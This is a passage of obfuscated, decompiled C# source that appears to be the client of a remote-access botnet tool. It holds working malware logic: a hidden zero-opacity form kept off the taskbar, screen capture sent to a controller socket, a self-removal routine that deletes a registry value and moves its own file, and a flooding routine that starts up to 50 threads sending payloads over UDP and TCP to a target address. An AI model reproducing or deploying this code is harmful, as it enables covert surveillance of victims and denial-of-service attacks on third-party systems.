                  this.\u0002(\u0001.\u0002(1395));
                }
              }
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1416)))
            {
              try
              {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0001.\u0002(551), true);
                if (registryKey.GetValue(\u0001.\u0002(612)) != null)
                  registryKey.DeleteValue(\u0001.\u0002(612));
                System.IO.File.Move(this.\u0003, this.\u0004 + \u0001.\u0002(452) + this.\u0001 + \u0001.\u0002(1170));
                Application.Exit();
              }
              catch
              {
                this.\u0002(\u0001.\u0002(1425));
              }
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1462)))
            {
              try
              {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                int width = bounds.Width;
                bounds = Screen.PrimaryScreen.Bounds;
                int height = bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics graphics1 = Graphics.FromImage((Image) bitmap);
                graphics1.CompositingMode = CompositingMode.SourceCopy;
                graphics1.CompositingQuality = CompositingQuality.HighSpeed;
                graphics1.SmoothingMode = SmoothingMode.HighSpeed;
                graphics1.InterpolationMode = InterpolationMode.Low;
                Graphics graphics2 = graphics1;
                bounds = Screen.PrimaryScreen.Bounds;
                int x = bounds.X;
                bounds = Screen.PrimaryScreen.Bounds;
                int y = bounds.Y;
                bounds = Screen.PrimaryScreen.Bounds;
                Size size = bounds.Size;
                graphics2.CopyFromScreen(x, y, 0, 0, size);
                MemoryStream memoryStream = new MemoryStream();
                bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
                byte[] array = memoryStream.ToArray();
                graphics1.Dispose();
                bitmap.Dispose();
                memoryStream.Close();
                memoryStream.Dispose();
                \u0001.\u0002(this.\u0001, \u0001.\u0002(115), array);
                \u0001.\u0002(this.\u0001, \u0001.\u0002(115), array);
              }
              catch
              {
                this.\u0002(\u0001.\u0002(1471));
              }
            }
          }
        }
        catch
        {
          this.\u0001.Disconnect(true);
          this.\u0002(false);
        }
      }
    }

    public void \u0002(string stat) => \u0001.\u0002(this.\u0001, \u0001.\u0002(1512), stat);

    private static string \u0002()
    {
      string path1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0001.\u0002(1521);
      DirectoryInfo[] directories = new DirectoryInfo(path1).GetDirectories(\u0001.\u0002(1558));
      if (directories.Length != 1)
        return string.Empty;
      string path2 = path1 + directories[0].Name + \u0001.\u0002(1571);
      return !System.IO.File.Exists(path2) ? string.Empty : path2;
    }

    public void \u0002(string Type, string Force, IPEndPoint ipEndPoint)
    {
      this.\u0002(\u0001.\u0002(1592));
      this.\u0002 = ipEndPoint;
      MemoryStream input = new MemoryStream(\u0003.\u0003.Sender);
      this.\u0001 = new BinaryReader((Stream) input).ReadBytes(512000);
      input.Dispose();
      this.\u0001 = new List<Thread>();
      string str = Type;
      if (str == null)
        return;
      if (!(str == \u0001.\u0002(1617)))
      {
        if (!(str == \u0001.\u0002(1622)))
        {
          if (!(str == \u0001.\u0002(1627)))
            return;
          this.\u0003 = new Thread(new ThreadStart(this.\u0004));
          this.\u0003.IsBackground = true;
          this.\u0003.Start();
          this.\u0002 = true;
        }
        else
        {
          this.\u0002 = new Thread(new ThreadStart(this.\u0005));
          this.\u0002.IsBackground = true;
          this.\u0002.Start();
          this.\u0002 = true;
        }
      }
      else
      {
        string key = Force;
        int num1;
        if (key != null)
        {
          // ISSUE: reference to a compiler-generated field
          if (\u0001.\u0003 == null)
          {
            // ISSUE: reference to a compiler-generated field
            \u0001.\u0003 = new Dictionary<string, int>(6)
            {
              {
                \u0001.\u0002(1636),
                0
              },
              {
                \u0001.\u0002(1641),
                1
              },
              {
                \u0001.\u0002(1650),
                2
              },
              {
                \u0001.\u0002(1659),
                3
              },
              {
                \u0001.\u0002(1668),
                4
              },
              {
                \u0001.\u0002(1681),
                5
              }
            };
          }
          int num2;
          // ISSUE: reference to a compiler-generated field
          // ISSUE: explicit non-virtual call
          if (__nonvirtual (\u0001.\u0003.TryGetValue(key, out num2)))
          {
            switch (num2)
            {
              case 0:
                num1 = 3;
                goto label_18;
              case 1:
                num1 = 7;
                goto label_18;
              case 2:
                num1 = 10;
                goto label_18;
              case 3:
                num1 = 13;
                goto label_18;
              case 4:
                num1 = 35;
                goto label_18;
              case 5:
                num1 = 50;
                goto label_18;
            }
          }
        }
        num1 = 0;
label_18:
        for (int index = 0; index < num1; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0006)));
          this.\u0001[index].IsBackground = true;
          this.\u0001[index].Start();
        }
        this.\u0002 = true;
      }
    }

    public void \u0004()
    {
    }

    private void \u0005()
    {
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);
      socket.Connect((EndPoint) this.\u0002);
      while (this.\u0002)
      {
        try
        {
          socket.Send(this.\u0001);
          if (!this.\u0001.Connected)
          {
            this.\u0002 = false;
            this.\u0002(false);
          }
        }
        catch
        {
        }
      }
    }

    private void \u0006()
    {
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
      while (this.\u0002)
      {
        try
        {
          socket.SendTo(this.\u0001, SocketFlags.None, (EndPoint) this.\u0002);
          if (!this.\u0001.Connected)
          {
            this.\u0002 = false;
            this.\u0002(false);
          }
        }
        catch
        {
        }
      }
    }

    private void \u0002(object sender, FormClosingEventArgs e)
    {
      this.\u0007();
      Application.DoEvents();
    }

    public void \u0007()
    {
      if (!this.\u0001.Connected)
        return;
      \u0001.\u0002(this.\u0001, \u0001.\u0002(1694));
      this.\u0001.Disconnect(true);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.\u0001 != null)
        this.\u0001.Dispose();
      base.Dispose(disposing);
    }

    private void \u0008()
    {
      this.SuspendLayout();
      this.AccessibleRole = AccessibleRole.None;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u0001.\u0002(1703);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Load += new EventHandler(this.\u0002);
      this.ResumeLayout(false);
    }
  }
}
